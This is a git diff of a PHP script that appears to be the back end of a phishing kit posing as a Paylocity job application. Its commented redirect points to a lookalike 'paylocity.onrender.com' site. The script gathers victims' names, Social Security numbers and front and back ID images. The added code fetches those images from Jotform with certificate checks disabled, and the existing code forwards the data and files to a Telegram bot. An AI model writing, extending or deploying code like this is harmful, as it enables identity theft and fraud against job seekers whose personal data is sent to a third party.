@@ -33,25 +33,88 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $timestamp = date("Y-m-d H:i:s");
 
-    // File handling - Process Front & Back ID
+
+
+    // Extract form ID and submission ID from $_POST
+    $form_id = $_POST['formID'] ?? '';
+    $submission_id = explode('_', $_POST['event_id'])[0] ?? '';
+
+    // Extract file names from temp_upload
+    $front_id_raw = $_POST['temp_upload']['q17_uploadYour'][0] ?? '';  // First uploaded file
+    $back_id_raw = $_POST['temp_upload']['q26_identityVerification'][0] ?? ''; // Second uploaded file
+
+    // Function to clean file name from Jotform's temp_upload data
+    function extractFileName($raw_string) {
+        return explode('#', $raw_string)[0];  // Get the actual filename before #
+    }
+
+    // Generate URLs
+    $front_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/" . extractFileName($front_id_raw);
+    $back_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/" . extractFileName($back_id_raw);
+
+
+
+
+
+
+    function downloadJotformFile($file_url, $save_path) {
+        $ch = curl_init($file_url);
+        $fp = fopen($save_path, 'wb');
+    
+        curl_setopt($ch, CURLOPT_FILE, $fp);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+        curl_exec($ch);
+        curl_close($ch);
+        fclose($fp);
+    }
+    
+    // Define where to save files
     $upload_dir = "uploads/";
     if (!is_dir($upload_dir)) {
         mkdir($upload_dir, 0777, true);
     }
+    
+    // Download files
+    $front_id_path = $upload_dir . "front_id_" . time() . ".jpg";
+    $back_id_path = $upload_dir . "back_id_" . time() . ".jpg";
+    
+    downloadJotformFile($front_id_url, $front_id_path);
+    downloadJotformFile($back_id_url, $back_id_path);
 
-    $front_id_path = null;
-    if (!empty($_FILES['file']['name'][0])) {  // Front ID
-        $front_id_name = basename($_FILES['file']['name'][0]);
-        $front_id_path = $upload_dir . time() . "_front_" . $front_id_name;
-        move_uploaded_file($_FILES['file']['tmp_name'][0], $front_id_path);
-    }
 
-    $back_id_path = null;
-    if (!empty($_FILES['file']['name'][1])) {  // Back ID
-        $back_id_name = basename($_FILES['file']['name'][1]);
-        $back_id_path = $upload_dir . time() . "_back_" . $back_id_name;
-        move_uploaded_file($_FILES['file']['tmp_name'][1], $back_id_path);
-    }
+
+
+
+
+    // File handling - Process Front & Back ID
+    // $upload_dir = "uploads/";
+    // if (!is_dir($upload_dir)) {
+    //     mkdir($upload_dir, 0777, true);
+    // }
+
+    // $front_id_path = null;
+    // if (!empty($_FILES['file']['name'][0])) {  // Front ID
+    //     $front_id_name = basename($_FILES['file']['name'][0]);
+    //     $front_id_path = $upload_dir . time() . "_front_" . $front_id_name;
+    //     move_uploaded_file($_FILES['file']['tmp_name'][0], $front_id_path);
+    // }
+
+    // $back_id_path = null;
+    // if (!empty($_FILES['file']['name'][1])) {  // Back ID
+    //     $back_id_name = basename($_FILES['file']['name'][1]);
+    //     $back_id_path = $upload_dir . time() . "_back_" . $back_id_name;
+    //     move_uploaded_file($_FILES['file']['tmp_name'][1], $back_id_path);
+    // }
+
+
+
+
+
+
+
 
     // Save to PostgreSQL
     // $conn = pg_connect("host=".DB_HOST." port=".DB_PORT." dbname=".DB_NAME." user=".DB_USER." password=".DB_PASS);
@@ -74,6 +137,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // pg_close($conn);
 
+
+
+
+
+
+
+
+
+
+
+
     // Prepare message for Telegram
     $telegram_message = "📝 *New Job Application*\n\n".
                         "👤 *Name:* $full_name\n".
@@ -87,6 +161,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                         "🔐 *SSN:* $ssn\n".
                         "⏳ *Submitted At:* $timestamp\n".
                         "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");
+
+
+
+
+
+
+
+
 
     // Send text message to Telegram
     $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
@@ -103,6 +185,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
+
+
+
+
+
 
     // Send files to Telegram
     $files_to_send = [
@@ -130,8 +217,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             curl_close($ch);
         }
     }
-    print_r($_POST);
-// header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
+
+    // header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
 // exit;
 }
 ?>
